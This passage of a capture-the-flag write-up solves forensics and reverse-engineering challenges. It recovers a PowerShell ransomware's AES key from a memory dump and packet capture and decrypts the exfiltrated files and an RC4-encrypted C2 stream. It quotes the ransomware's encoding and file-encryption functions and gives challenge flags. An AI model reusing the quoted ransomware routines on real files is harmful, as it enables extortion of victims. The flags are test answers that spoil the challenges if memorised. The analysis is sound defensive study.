        LOCALAPPDATA=C:\Users\IEUser\AppData\Local
        LOGONSERVER=\\ADMINISTRATOR
        NUMBER_OF_PROCESSORS=2
        OneDrive=C:\Users\IEUser\OneDrive
        OS=Windows_NT
        Path=C:\Python27\;C:\Python27\Scripts;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\IEUser\AppData\Local\Programs\Python\Python37\Scripts\;C:\Users\IEUser\AppData\Local\Programs\Python\Python37\;C:\Users\IEUser\AppData\Local\Microsoft\WindowsApps;
        PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
        PROCESSOR_ARCHITECTURE=AMD64
        PROCESSOR_IDENTIFIER=AMD64 Family 23 Model 104 Stepping 1, AuthenticAMD
        PROCESSOR_LEVEL=23
        PROCESSOR_REVISION=6801
        ProgramData=C:\ProgramData
        ProgramFiles=C:\Program Files
        ProgramFiles(x86)=C:\Program Files (x86)
        ProgramW6432=C:\Program Files
        PSModulePath=C:\Users\IEUser\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
        PUBLIC=C:\Users\Public
        SESSIONNAME=Console
        SystemDrive=C:
        SystemRoot=C:\Windows
        TEMP=C:\Users\IEUser\AppData\Local\Temp
        TMP=C:\Users\IEUser\AppData\Local\Temp
        USERDOMAIN=ADMINISTRATOR
        USERDOMAIN_ROAMINGPROFILE=ADMINISTRATOR
        USERNAME=WIN-HO5DPB1FVND
        USERPROFILE=C:\Users\IEUser
        windir=C:\Windows

```

**COMPUTERNAME=ADMINISTRATOR
USERNAME=WIN-HO5DPB1FVND**
Okay we got 2/3 of the key the last one this time & date, we can check the http post request as the code already said, it encrypt the key then send it right away, so the time when it use for encryption and send with the time it got capture by wireshark not that different so this is the time and date **2024-09-19 00:09:34** (make sure you got the format correctly HH:mm - dd/MM/yy so it should be **00:09 - 19/09/2024**)

comebine these 3 part of the key we got the key we need
```
0009190924win-ho5dpb1fvndadministrator
```

But we are not done yet 'cause it need to be convert into SHA256

```
211afe5745147fb0da2c2720c5439c45d4d7f81f86a83a27531d9f19e4689e30
```
That the first way, now the second, by logically the key must be sent first so this must be it

![image](https://hackmd.io/_uploads/B1fWaD4yJx.png)

```
0IzL5AzL5_DItASOwoDMwAiPgQmb2ZWMiBHZ18Gat4Wa3BiPgI3b0Fmc0NXaulWbkFGI+AiWsZ_TkRFaupFVaNjYqZ_akpnV0RmbWVnWy40VTJjSRJ2X1cFZHZVUlhlTtQmbOBFTxQWWShFawV1V5MVUtp0STRkWxFlaORkTHZkRWRUV4ZlVOp0VnBiP
```
Let take a look back at how it got sent

```ps1 h!
$cvf = Invoke-AESEncryption -Key $Uz19o -Text $WiETm ; $cVl = R64Encoder -t $cvf
$2YngY = "> $cVl > $OgE > $zVSza > $7VEq"
```

it got R64 encoded then send it, so how about we deR64 it then, let's talk about R64 encode a little bit shall we?

```ps1 h!
function R64Encoder { 
   if ($args[0] -eq "-t") { $VaFQ = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($args[1])) }
   if ($args[0] -eq "-f") { $VaFQ = [Convert]::ToBase64String([IO.File]::ReadAllBytes($args[1])) }
   $VaFQ = $VaFQ.Split("=")[0] ; $VaFQ = $VaFQ.Replace("C", "-") ; $VaFQ = $VaFQ.Replace("E", "_")
   $8bKW = $VaFQ.ToCharArray() ; [array]::Reverse($8bKW) ; $R64Base = -join $8bKW ; return $R64Base }
```
So it reverse the string, base64 encode it, get rid of the padding then replace E with _ and C with - (I already said about it above) so we just need to reverse it and got the key we need

```python h!
def force_base64_decode(data):
    missing_padding = len(data) % 4
    if missing_padding != 0:
        data += '=' * (4 - missing_padding)
    
    try:
        decoded_data = base64.b64decode(data)
        return decoded_data, None
    except (binascii.Error, UnicodeDecodeError):
        return None, "Decoding failed"

def transform_and_decode(data):
    data = data[::-1]
    transformed_data = data.replace('-', 'C').replace('_', 'E')
    decoded_data, error = force_base64_decode(transformed_data)
    return decoded_data, error
```

and we got the key also some credential infomations back

```h!
> gWJNVVxUDVFFGNDNjQqZDSKJmQS9WUphXRYd1LPNnd-NXeQVGdW5_bQJ2SWN2ZuVndtVzdhFjb3ZTZnhTdLFlZ > administrator > win-ho5dpb1fvnd > 00:09 - 19/09/24
```
remember the pattern? its **"> $cVl > $OgE > $zVSza > $7VEq"** and there you go, all the credentials is the same as when we extracted them from dmp and pcap

lets DeR64 the $**cVI**
```
fQKu8ge6wn1aw5mvungcVKbPlNVtePysBvsO/WXExiQoRBbJH6jB3C4aET51USIZ
```
okay this is the $cvf that has our real key for AES, next question, how to decrypt AES CBC 256?, we got the key, ciphertext then what about IV? It's time we bring up the Invoke-AES_Encyption Function

```ps1 h!
function Invoke-AESEncryption {
   [CmdletBinding()]
   [OutputType([string])]
   Param(
       [Parameter(Mandatory = $true)]
       [String]$Key,

       [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
       [String]$Text,

       [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
       [String]$Path)

   Begin {
      $m95I = New-Object System.Security.Cryptography.SHA256Managed
      $n9ibn = New-Object System.Security.Cryptography.AesManaged
      $n9ibn.Mode = [System.Security.Cryptography.CipherMode]::CBC
      $n9ibn.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
      $n9ibn.BlockSize = 128
      $n9ibn.KeySize = 256 }

   Process {
      $n9ibn.Key = $m95I.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

      if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}

      if ($Path) {
         $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
         if (!$File.FullName) { break }
         $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
         $outPath = $File.FullName + ".enc" }

      $encryptor = $n9ibn.CreateEncryptor()
      $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
      $encryptedBytes = $n9ibn.IV + $encryptedBytes
      $n9ibn.Dispose()

      if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
      if ($Path) {
         [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
         (Get-Item $outPath).LastWriteTime = $File.LastWriteTime }}

  End {
      $m95I.Dispose()
      $n9ibn.Dispose()}}
```

Notice this line right here:
`$encryptedBytes = $n9ibn.IV + $encryptedBytes`
So we got the solution to where the IV are, it right at the beginning of the encrypted data, its exactly 16 starting bytes of those encrypted data, lets get back the key, I'm too lazy to write the code for decryption again so I will be using cyberchef

![image](https://hackmd.io/_uploads/H1xiXOE1ye.png)

Okay we got the real key, make sure not to forget the SHA256 part

```
YaMfem0zr4jdiZsDUxv1TH69
87db61d8626cfea8e091d71753d913116f53e49804ff6eb5b7eb69ef5a521ab8
```

So, we finally made it to this phase, it almost the final phase, before that I do you remember when I said it send the key first? it also send the log of all the file got encrypted, the method is the same as the key only R64 encoded let take a look.

```h!
[!] C:\Users\IEUser\Documents\13bae5d78b3351adcd58116cc58465ed.png is now encrypted [!] C:\Users\IEUser\Documents\248368233_230702282385338_6224698627922749235_n.jpg is now encrypted [!] C:\Users\IEUser\Documents\ad1639ada044a912032925bdc7f132c8.jpg is now encrypted [!] C:\Users\IEUser\Documents\black.png is now encrypted [!] C:\Users\IEUser\Documents\flag_1.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_10.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_11.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_12.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_13.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_14.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_15.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_16.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_17.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_18.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_19.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_2.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_20.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_21.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_22.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_23.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_24.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_25.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_26.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_27.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_28.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_29.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_3.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_30.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_31.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_32.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_33.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_34.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_35.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_36.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_37.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_38.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_39.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_4.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_40.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_41.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_42.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_43.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_44.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_45.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_46.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_47.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_48.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_49.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_5.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_50.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_51.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_52.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_53.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_54.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_55.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_56.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_57.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_58.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_59.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_6.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_7.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_8.txt is now encrypted [!] C:\Users\IEUser\Documents\flag_9.txt is now encrypted [!] C:\Users\IEUser\Documents\IoT_security_IoTSec_considerations_requirements_and_architectures.pdf is now encrypted [!] C:\Users\IEUser\Documents\jM-z3b7f_400x400.jpg is now encrypted [!] C:\Users\IEUser\Documents\mim.png is now encrypted [!] C:\Users\IEUser\Documents\pexels-sebastiaan-stam-1097456.jpg is now encrypted [!] C:\Users\IEUser\Documents\vietnam.jpg is now encrypted [!] C:\Users\IEUser\Documents\z3399223868975_f9672eaf281fbf6771659ccb18692a12.jpg is now encrypted
```
So the Flag got devided into 57 parts from 1 to 59 and not order, we can use this log to trace back the original flag if it got messed up.

Lets start the Final phase, decrypting the all the encrypted data, "How to get all the encrypted data out of the pcap file?" you may ask, there are many way of doing that, you can follow the http stream since it all done in a single time so all the of them should be in the same stream or you can do like me:

1. Export all these file in the same folder

![image](https://hackmd.io/_uploads/HyEXUdV11l.png)

2. We already know it just a flag got divided into 57 parts so it very light, you can straight up delete all those heavy file, long name, log, data since all we need to get is only the flag also, these are the evidence of those flag

![image](https://hackmd.io/_uploads/B16qLuEJkx.png)

![image](https://hackmd.io/_uploads/BkMpIuEyyx.png)

this is all we left after deleting just these small, light files, you can use string or grep all of them into a txt file, this is my code anyway (I know I'm too lazy to optimize it and change it, I use it to solve all the way from beginning anyway so tooooooo Lazy to optimize it)

```py h!
import re
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import binascii

def force_base64_decode(data):
    missing_padding = len(data) % 4
    if missing_padding != 0:
        data += '=' * (4 - missing_padding)
    
    try:
        decoded_data = base64.b64decode(data)
        return decoded_data, None
    except (binascii.Error, UnicodeDecodeError):
        return None, "Decoding failed"

def transform_and_decode(data):
    data = data[::-1]
    transformed_data = data.replace('-', 'C').replace('_', 'E')
    decoded_data, error = force_base64_decode(transformed_data)
    return decoded_data, error

def decrypt_aes_cbc(decoded_data):
    key = bytes.fromhex("87db61d8626cfea8e091d71753d913116f53e49804ff6eb5b7eb69ef5a521ab8")
    iv = decoded_data[:16]
    ciphertext = decoded_data[16:]
    
    try:
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted_data = unpad(cipher.decrypt(ciphertext), AES.block_size)
        hex_data = decrypted_data.hex()
        ascii_data = decrypted_data.decode('utf-8', errors='ignore')
        return hex_data, ascii_data
    except (ValueError, KeyError):
        return "Decryption failed", None

def extract_content(input_file, output_hex_file, output_ascii_file):
    with open(input_file, 'r') as infile:
        data = infile.read()
    pattern = r'Content-Length: \d+\s*\n\n(.+?)\s+HTTP/1.1 200 OK'
    matches = re.findall(pattern, data, re.DOTALL)

    with open(output_hex_file, 'w', encoding='utf-8') as hex_outfile, open(output_ascii_file, 'w', encoding='utf-8') as ascii_outfile:
        for match in matches:
            match = match.strip()
            decoded_data, decode_error = transform_and_decode(match)
            if decode_error:
                print(f"Skipping entry due to base64 decoding error: {decode_error}")
                continue

            decrypted_hex, decrypted_ascii = decrypt_aes_cbc(decoded_data)
            if decrypted_hex == "Decryption failed":
                print("Decryption failed for the entry.")
            else:
                hex_outfile.write(decrypted_hex + "\n -----------------\n")
                ascii_outfile.write(decrypted_ascii + "\n ----------------- \n")

if __name__ == "__main__":
    input_file = "data.txt"
    output_hex_file = "output_hex.txt" 
    output_ascii_file = "output_ascii.txt"  
    extract_content(input_file, output_hex_file, output_ascii_file)
    print(f"Extracted data written to {output_hex_file} (hex) and {output_ascii_file} (ASCII).")

```

Running this code will give you whatever cipher text you put in the data.txt, if you put the whole code conversation =))) you will get like 3 pictures and some pdfs if I remembered correctly, but there a part like this

![image](https://hackmd.io/_uploads/rkIVdO4yyg.png)

Yea its the flag just copy it to a different place and delete all the line, you will get this =)))

![image](https://hackmd.io/_uploads/B1Gwu_4yyx.png)

Remember what I said earlier? the log contain the history so I write this code and got the flag (you can do it manually, I'm just too lazy to do that)

```py h!
def reorder_string_by_flags(input_string, flag_files):
    reordered_string = [''] * len(flag_files)
    for flag in flag_files:
        index = int(flag.split('_')[1].split('.')[0])
        reordered_string[index - 1] = input_string[flag_files.index(flag)]


    return ''.join(reordered_string)


if __name__ == "__main__":
    input_string = "Ah1n9_1$_m0Sr3_pr3c10uC5_7h4n_1ndIEp3ndenc3_S&_fr33d0m}{N0t"
    flag_files = [
        "flag_1.txt", "flag_10.txt", "flag_11.txt", "flag_12.txt", "flag_13.txt", "flag_14.txt", 
        "flag_15.txt", "flag_16.txt", "flag_17.txt", "flag_18.txt", "flag_19.txt", "flag_2.txt", 
        "flag_20.txt", "flag_21.txt", "flag_22.txt", "flag_23.txt", "flag_24.txt", "flag_25.txt", 
        "flag_26.txt", "flag_27.txt", "flag_28.txt", "flag_29.txt", "flag_3.txt", "flag_30.txt", 
        "flag_31.txt", "flag_32.txt", "flag_33.txt", "flag_34.txt", "flag_35.txt", "flag_36.txt", 
        "flag_37.txt", "flag_38.txt", "flag_39.txt", "flag_4.txt", "flag_40.txt", "flag_41.txt", 
        "flag_42.txt", "flag_43.txt", "flag_44.txt", "flag_45.txt", "flag_46.txt", "flag_47.txt", 
        "flag_48.txt", "flag_49.txt", "flag_5.txt", "flag_50.txt", "flag_51.txt", "flag_52.txt", 
        "flag_53.txt", "flag_54.txt", "flag_55.txt", "flag_56.txt", "flag_57.txt", "flag_58.txt", 
        "flag_59.txt", "flag_6.txt", "flag_7.txt", "flag_8.txt", "flag_9.txt"
    ]
    
    result = reorder_string_by_flags(input_string, flag_files)
    
    print(result)

```

Flag: `ASCIS{N0th1n9_1$_m0r3_pr3c10u5_7h4n_1ndEp3ndenc3_&_fr33d0m}`

**Thank you so much for the fun journey Bquaman**

---

### easy forensics

![image](https://hackmd.io/_uploads/rynAKdEJJx.png)

The challenge gave us a dump file and a zip file with password so it must contain the flag or something, the author also said something about a mallicious code, so lets access it using volatility

![image](https://hackmd.io/_uploads/HJRRcuE1Jx.png)

We can see that there was a FoxitPDFReader running while the computer's ram got capturing. So I will check the user desktop to see are there any PDF file on the screen

![image](https://hackmd.io/_uploads/By5hj_Vkyg.png)

For some reason there just a shortcut of the PDFReader but there a PE seem suspicous, I will dump it out.

![image](https://hackmd.io/_uploads/S1fG3u4ykx.png)

So this is the point where it start wasting your time, you thought it need to be reversed? actually, **NO you just need to string it, the password is base64 encoded**

![image](https://hackmd.io/_uploads/rys3h_Vyyx.png)

![image](https://hackmd.io/_uploads/Sk_phu41ke.png)

Flag: ASCIS{Gh4st1n_Th3_R2M}

## Reverse Engineering

### Trustme

![image](https://hackmd.io/_uploads/rkSA9ak3kg.png)

Open the trustme.exe in IDA, checking the main wont find us anything so special beside an antidebug and checking debugger function

![image](https://hackmd.io/_uploads/Sy_N2py3Je.png)

But these 2 lines, definately cause an exception, this is some type of exception handler RE. 

```
  MEMORY[0] = 0;
  JUMPOUT(0);
```

![image](https://hackmd.io/_uploads/S1JCg0k3Je.png)


But I'm still too new with this so I will be open the string and find where it start doing it's magic

![image](https://hackmd.io/_uploads/HkrG-Ay2Jg.png)

I see it connect to a IP and Port, so I just start from it. The address of the function that we need to focus was an offset with no calling or jumping into it, maybe it must have something to do with the "Exception Handling"

![image](https://hackmd.io/_uploads/ryydZA12ke.png)

![image](https://hackmd.io/_uploads/Hy6KW0k3kx.png)

If you debug a little bit you will see it sending and receive thing from that IP address

![image](https://hackmd.io/_uploads/HyQvf0ynkg.png)

So what it was retrieving was the RC4 key to decrypt something

![image](https://hackmd.io/_uploads/BJMSXRJ3ke.png)

![image](https://hackmd.io/_uploads/r1XQNCyhJe.png)

after the 4 bytes Length must be data it got encrypted with the key that it received

![image](https://hackmd.io/_uploads/rk9-SRknye.png)

This look right because the string was a random generated string

![image](https://hackmd.io/_uploads/S1iwH0khkg.png)

The size seem correct, since the hex-value of the size it 0x40 and it sent 4 bytes so its "40000000" convert to decimal is 64, the string was 64 bytes longs

![image](https://hackmd.io/_uploads/BkjJ80ynJx.png)

original key
```
WTPjWbJafqNPqrZFswaijmyVKMddOrKzukegbVDpXJqDfulPDmDwDasqTwxvibnM
```

Next the server send something back to us, maybe a DLL or PE since there was a a function was validating the header "MZ" then run the thing got decrypted.

![image](https://hackmd.io/_uploads/HyilwR1nke.png)

![image](https://hackmd.io/_uploads/rkjUP01n1l.png)

![image](https://hackmd.io/_uploads/Hk0OD0121x.png)

Now, let's get back the file got sent back from the server, since we already got the key, this should be it!

![image](https://hackmd.io/_uploads/BJNyOAk2Je.png)

So this was a DLL, it exported 4 option to run, gen0-3

![image](https://hackmd.io/_uploads/HknNu0knkg.png)

![image](https://hackmd.io/_uploads/Sk-FdRknJg.png)

![image](https://hackmd.io/_uploads/rJQquAJn1g.png)

![image](https://hackmd.io/_uploads/HkjqOC12yx.png)

![image](https://hackmd.io/_uploads/SJzjdCJnyl.png)

To summerize this was the function of those option

**Gen0:** write the string backward
**Gen1:** upper -> lower and lower -> upper
**Gen2:** which rotates the string right by 1
**Gen3:** Caeser Cipher +13

So the how does the server and client exchange the encrypt and key? Actually it like the the first part, since the server already got our key so we can skip that part, but it send the byte that set the mode of the encryption key

![image](https://hackmd.io/_uploads/SJhOjAy3Jl.png)

![image](https://hackmd.io/_uploads/BJ-Ao0khyg.png)

This is all the mode in order

![image](https://hackmd.io/_uploads/Syn1h01n1g.png)

```
mode: 2,1,1,2,3,2,3,1,2,3,1,0,2,3,0,0,2,1,1,0,0,3
```

So we just need to dump this stream out, get rid of the first part about the DLL and the original key, the mode was set for the type of the key, using the original key we can get all of the 4 keys

```
00
MnbivxwTqsaDwDmDPlufDqJXpDVbgekuzKrOddMKVymjiawsFZrqPNqfaJbWjPTW
01
wtpJwBjAFQnpQRzfSWAIJMYvkmDDoRkZUKEGBvdPxjQdFULpdMdWdASQtWXVIBNm
02
MWTPjWbJafqNPqrZFswaijmyVKMddOrKzukegbVDpXJqDfulPDmDwDasqTwxvibn
03
JGCwJoWnsdACdeMSfjnvwzlIXZqqBeXmhxrtoIQcKWdQshyCQzQjQnfdGjkivoaZ
```

With a little skill of prompting, we can ask Claude or GPT to write a script to solve this.

```python!
def rc4_decrypt(encrypted_data, key):
    if isinstance(key, str):
        key = key.encode('utf-8')
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    result = bytearray()
    
    for byte in encrypted_data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        k = S[(S[i] + S[j]) % 256]
        result.append(byte ^ k) 
    
    return bytes(result)

def hex_to_bytes(hex_data):
    try:
        hex_data = ''.join(hex_data.split())
        return bytes.fromhex(hex_data)
    except Exception as e:
        print(f"Error converting hex to bytes: {str(e)}")
        return None

def process_file(input_file, output_file, rc4_keys):
    try:
        with open(input_file, 'r', encoding='utf-8', errors='replace') as f:
            content = f.read()
        decoded_data = []
        lines = content.splitlines()
        i = 0
        current_mode = None
        hex_chunks = []
        
        while i < len(lines):
            line = lines[i].strip()
            if line in ["00", "01", "02", "03"]:

                if current_mode is not None and hex_chunks:
                    key_name = f"gen{current_mode[-1]}"
                    current_key = rc4_keys[key_name]
                    combined_hex = ''.join(hex_chunks)
                    byte_data = hex_to_bytes(combined_hex)
                    
                    if byte_data:
                        try:
                            decoded = rc4_decrypt(byte_data, current_key)
                            decoded_data.append(decoded)
                            #print(f"Mode {current_mode}: Decoded {len(byte_data)} bytes")
                        except Exception as e:
                            print(f"Error decoding with mode {current_mode}: {str(e)}")

                current_mode = line
                hex_chunks = []
                print(f"mode {current_mode}")
                i += 1  # Move to the next line
                if i < len(lines):
                    #print(f"Skipping line: {lines[i]}")
                    i += 1
                
            elif current_mode is not None:
                if line:
                    hex_chunks.append(line)
                i += 1
            else:
                i += 1

        if current_mode is not None and hex_chunks:
            key_name = f"gen{current_mode[-1]}"
            current_key = rc4_keys[key_name]
        
            combined_hex = ''.join(hex_chunks)
            byte_data = hex_to_bytes(combined_hex)
            
            if byte_data:
                try:
                    decoded = rc4_decrypt(byte_data, current_key)
                    decoded_data.append(decoded)
                    print(f"Mode {current_mode}: Decoded {len(byte_data)} bytes")
                except Exception as e:
                    print(f"Error decoding with mode {current_mode}: {str(e)}")
        
        with open(output_file, 'wb') as f:
            for data in decoded_data:
                f.write(data)
        
        print(f"Successfully decoded data and wrote to {output_file}")
        
    except Exception as e:
        print(f"Error: {str(e)}")

def main():
    input_file = "input.txt"
    output_file = "IloveCarlotta.bmp"
    rc4_keys = {
        "gen0": "MnbivxwTqsaDwDmDPlufDqJXpDVbgekuzKrOddMKVymjiawsFZrqPNqfaJbWjPTW",
        "gen1": "wtpJwBjAFQnpQRzfSWAIJMYvkmDDoRkZUKEGBvdPxjQdFULpdMdWdASQtWXVIBNm",
        "gen2": "MWTPjWbJafqNPqrZFswaijmyVKMddOrKzukegbVDpXJqDfulPDmDwDasqTwxvibn",
        "gen3": "JGCwJoWnsdACdeMSfjnvwzlIXZqqBeXmhxrtoIQcKWdQshyCQzQjQnfdGjkivoaZ"
    }
    
    process_file(input_file, output_file, rc4_keys)

if __name__ == "__main__":
    main()
```

![image](https://hackmd.io/_uploads/ryqChCy3yx.png)

